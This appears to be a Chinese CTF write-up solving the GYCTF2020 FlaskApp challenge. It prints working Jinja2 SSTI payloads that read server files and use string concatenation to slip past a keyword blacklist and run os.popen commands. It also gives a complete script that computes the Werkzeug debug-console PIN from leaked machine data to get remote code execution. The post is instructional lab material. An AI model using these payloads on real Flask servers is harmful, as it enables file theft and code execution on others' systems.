---

title: 日常练习28——关于flask框架的再进一步

date: 2021-05-03 15:09:49

tags: 练习

categories: test77

---
# [GYCTF2020]FlaskApp  

看到题目就应该知道这道题想考什么，关于flask框架目前我只见过ssti注入，所以这道题一开始也是往ssti上想。  

打开题目，发现是一个再flask框架下的base64加密程序。输入字符会被加密成base64码。  

我们先输入一个测试ssti注入的{ {7*7} }；  

[![](https://img.imgdb.cn/item/6092b727d1a9ae528f1fbd7d.png)](https://img.imgdb.cn/item/6092b727d1a9ae528f1fbd7d.png)  

得到base64编码，然后我们再将其放到解码页面解码。  

[![](https://img.imgdb.cn/item/6092b768d1a9ae528f235142.png)](https://img.imgdb.cn/item/6092b768d1a9ae528f235142.png)  

可以看到。应该是有些字符被过滤了，并没有成功注入，但是这也告诉我们了这道题的思路，就是将我们注入的payload编码然后再放到解码页面解码，绕过过滤后成功注入。  

那么接下来就是要找什么被过滤了，我们看一下题目中的提示。提示说“失败乃是成功之母”？？？？这个是啥意思，看了别人的wp后才知道这个是提示我们开启了debug模式，当我们输入一些不能解码的字符，就会跳转到debug界面，而flask开启debug模式是很危险的，这里简单说一下原因：  

如图所示的debug界面：  

[![](https://pic.imgdb.cn/item/6094d3ead1a9ae528f452640.png)](https://pic.imgdb.cn/item/6094d3ead1a9ae528f452640.png)  

可以看到，当我们开启了debug模式后，我们是可以看到报错部分的部分代码的，这就造成了源码的泄露，有些黑客就可以通过这一点来绕过一些保护，比如现在已经泄露了以下源码：  

	@app.route('/decode',methods=['POST','GET'])
	
	def decode():

    if request.values.get('text') :

	[Open an interactive python shell in this frame]         text = request.values.get("text")

        text_decode = base64.b64decode(text.encode())

        tmp = "结果 ： {0}".format(text_decode.decode())

        if waf(tmp) :

            flash("no no no !!")

            return redirect(url_for('decode'))

        res =  render_template_string(tmp)

        flash( res )  

可以清楚的看到这里有一个waf保护，其中就有第一次我们测试注入的字符，而我们要做的就是绕过这个waf。  

那么waf具体是什么呢，这里我们需要查看一下，这里参考大佬的ssti注入语句并且需要进行修改（链接会放在后面，tql）  

	{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}

这样我们就可以查看到整个app.py的源码了：  

[![](https://pic.imgdb.cn/item/6094d89bd1a9ae528f7fb41f.png)](https://pic.imgdb.cn/item/6094d89bd1a9ae528f7fb41f.png)  

可以看到waf到底过滤了什么字符：  

	 def waf(str): black_list = 
	[flag;os；system；popen;import;eval;chr;request;subprocess;commands;socket;hex;base64;*;?;]    

可以看到flag，os等字符串被过滤了，这里我们如果想要读取flag，那么我们需要用字符串拼接的方法来读取（又get到一个绕过小姿势）  

	{% for c in [].__class__.__base__.__subclasses__() %}
	{% if c.__name__ == 'catch_warnings' %}
	{% for b in c.__init__.__globals__.values() %}
	{% if b.__class__ == {}.__class__ %}
    {% if 'eva'+'l' in b.keys() %}
      {{ b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()') }}
    {% endif %}
	{% endif %}
	{% endfor %}
	{% endif %}
	{% endfor %}

	查看文件目录，  

	{% for c in [].__class__.__base__.__subclasses__() %}
	{% if c.__name__ == 'catch_warnings' %}
	{% for b in c.__init__.__globals__.values() %}
	{% if b.__class__ == {}.__class__ %}
    {% if 'eva'+'l' in b.keys() %}
      {{ b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("cat /this_is_the_fla'+'g.txt").read()') }}
    {% endif %}
	{% endif %}
	{% endfor %}
	{% endif %}
	{% endfor %}  

	查看flag。  

但是上面说的方法其实并不是预期解，这道题的真正解法其实是利用pin码进行rec。  

## 利用pin码进行RCE  

关于pin码（即个人识别码）的具体介绍我就不多说了，我们可以简单理解为一个密码，这个密码是干什么用的呢？这就要联系到前面我们讲过的debug模式了。  

我们已经知道，开启debug模式会泄露部分源码，更严重的安全问题是**debug页面中包含Python的交互式shell，可以执行任意Python代码**  

而旧版的flask是不需要输入pin码就可以执行代码的，其危害不言而喻，而在新的flask版本中，需要输入pin码才能执行自定义的代码，所以我们可以把pin码理解为进入交互shell的密码。  

关于pin码的生成机制我就不说了，这一块感觉不是我现在能搞明白的，下面会附上文章，我们要知道，如果要想得到pin码，那么我们需要获取如下信息：  

	1、服务器运行flask所登录的用户名。通过/etc/passwd中可以猜测为flaskweb 或者root，此处用的flaskweb
	
	2、modname。一般不变就是flask.app
	
	3、getattr(app, “__name__”, app.__class__.__name__)。python该值一般为Flask，该值一般不变
	
	4、flask库下app.py的绝对路径。报错信息会泄露该值。题中为/usr/local/lib/python3.7/site-packages/flask/app.py（这里又是debug模式带来的安全问题）
	
	5、当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address 获取(eth0为网卡名)
	
	6、机器的id：对于非docker机每一个机器都会有自已唯一的id
	Linux：/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件
	Windows系统：
	docker：/proc/self/cgroup

首先获取mac地址：  

	{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() }}{% endif %}{% endfor %}  

得到mac地址02:42:ac:10:a9:51

[![](https://pic.imgdb.cn/item/6094eec5d1a9ae528f798533.png)](https://pic.imgdb.cn/item/6094eec5d1a9ae528f798533.png)  

然后将mac地址转化成十进制数为2485377870161。  

接下来是获取机器id：  

	{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() }}{% endif %}{% endfor %}  

得到id为：6f2214d51457a0a7a59e597564a2b066a05375f51c5dbe1742b5d5dea9e929da

[![](https://pic.imgdb.cn/item/6094eff2d1a9ae528f8592f1.png)](https://pic.imgdb.cn/item/6094eff2d1a9ae528f8592f1.png)

接下来用大佬的脚本来生成pin码（再次直呼tql）  

	import hashlib
	from itertools import chain

	probably_public_bits = [
    'flaskweb',#服务器运行flask所登录的用户名
    'flask.app',#modname
    'Flask',#getattr(app, "\_\_name__", app.\_\_class__.\_\_name__)
    '/usr/local/lib/python3.7/site-packages/flask/app.py',#flask库下app.py的绝对路径
	]

	private_bits = [
    '2485377870161',#当前网络的mac地址的十进制数
    '6f2214d51457a0a7a59e597564a2b066a05375f51c5dbe1742b5d5dea9e929da'#机器的id
	]

	h = hashlib.md5()
	for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
	h.update(b'cookiesalt')
	cookie_name = '__wzd' + h.hexdigest()[:20]
	num = None
	if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
	rv =None
	if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
	print(rv)

这样就能得到pin码，pin码为：222-246-872。  

[![](https://pic.imgdb.cn/item/6094f146d1a9ae528f927279.png)](https://pic.imgdb.cn/item/6094f146d1a9ae528f927279.png)  

那么我们再次来到debug界面，点击右侧的命令符，输入pin码后就可以执行自定义的python代码了。  

	import os
	os.popen("ls -l /").read()#查看文件目录
	os.popen("cat /this_is_the_flag.txt").read()#读取flag文件  

[![](https://pic.imgdb.cn/item/6094f2bfd1a9ae528f9ffcbc.png)](https://pic.imgdb.cn/item/6094f2bfd1a9ae528f9ffcbc.png)  

得到flag。  

# 小结  

这道题目让我对于flask这个框架有了进一步的认识，关于其debug模式开启后造成的安全隐患和ssti注入的新的办法，最重要的是pin码这一新知识点，关于pin码有了一个大概的了解，对于pin码的生成和使用有了了解。   

下面附上相关博客和文章。  

[Flask开启debug模式等于给黑客留了后门](https://zhuanlan.zhihu.com/p/32138231)  
[Flask debug 模式 PIN 码生成机制安全性研究笔记](https://www.cnblogs.com/HacTF/p/8160076.html)  
[关于Flask SSTI，解锁你不知道的新姿势](https://www.secpulse.com/archives/140019.html)  
[个人对PIN码的基本理解](https://blog.csdn.net/xmousez/article/details/57097754?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162037459616780269875419%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162037459616780269875419&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-57097754.first_rank_v2_pc_rank_v29&utm_term=pin%E7%A0%81)